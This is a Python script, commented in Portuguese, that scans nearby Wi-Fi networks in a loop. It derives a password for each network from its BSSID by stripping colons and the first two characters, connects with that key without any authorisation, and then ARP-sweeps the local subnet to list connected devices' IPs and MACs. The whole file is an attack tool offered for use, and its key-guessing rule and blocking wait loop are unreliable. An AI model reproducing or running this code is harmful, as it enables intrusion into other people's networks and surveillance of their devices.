import pywifi
from scapy.all import ARP, Ether, srp

# Função para obter os dispositivos conectados na rede local
def obter_dispositivos_conectados():
    # Cria um pacote ARP
    arp = ARP(pdst="192.168.0.1/24")
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    pacote = ether/arp

    # Envia e recebe o pacote ARP
    resultado = srp(pacote, timeout=3, verbose=0)[0]

    # Lista para armazenar os dispositivos encontrados
    dispositivos = []

    # Processa os resultados
    for sent, received in resultado:
        dispositivos.append({'IP': received.psrc, 'MAC': received.hwsrc})

    return dispositivos

# Função para calcular a senha da rede Wi-Fi com base no BSSID
def calcular_senha(bssid):
    # Remove os ":" do BSSID
    bssid = bssid.replace(":", "")

    # Remove os dois primeiros dígitos do BSSID
    bssid = bssid[2:]

    return bssid

# Inicializa o objeto Wifi
wifi = pywifi.PyWiFi()

# Obtém a primeira interface Wi-Fi disponível
iface = wifi.interfaces()[0]

# Ativa a interface
iface.enable()

# Obtém a lista de redes Wi-Fi disponíveis
networks = []

# Loop para conectar-se a todas as redes disponíveis
while True:
    # Obtém as redes Wi-Fi disponíveis
    scan_results = iface.scan_results()

    # Itera sobre as redes disponíveis
    for network in scan_results:
        # Verifica se a rede já foi adicionada à lista
        if network not in networks:
            # Calcula a senha da rede Wi-Fi
            senha_wifi = calcular_senha(network.bssid)

            # Conecta-se à rede escolhida usando a senha calculada
            perfil = pywifi.Profile()
            perfil.ssid = network.ssid
            perfil.auth = pywifi.const.AUTH_ALG_OPEN
            perfil.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
            perfil.cipher = pywifi.const.CIPHER_TYPE_CCMP
            perfil.key = senha_wifi

            iface.remove_all_network_profiles()
            temp_profile = iface.add_network_profile(perfil)
            iface.connect(temp_profile)

            print(f"Conectado à rede Wi-Fi: {network.ssid} - BSSID: {network.bssid} - Senha: {senha_wifi}")

            # Adiciona a rede à lista de redes conectadas
            networks.append(network)

    # Aguarda até que a conexão seja estabelecida
    while iface.status() != pywifi.const.IFACE_CONNECTED:
        pass

    print("Conexão Wi-Fi estabelecida!")

    # Obtém a lista de dispositivos conectados
    dispositivos_conectados = obter_dispositivos_conectados()

    # Imprime os dispositivos conectados
    print("\nDispositivos conectados na rede:")
    for dispositivo in dispositivos_conectados:
        print(f"IP: {dispositivo['IP']} - MAC: {dispositivo['MAC']}")
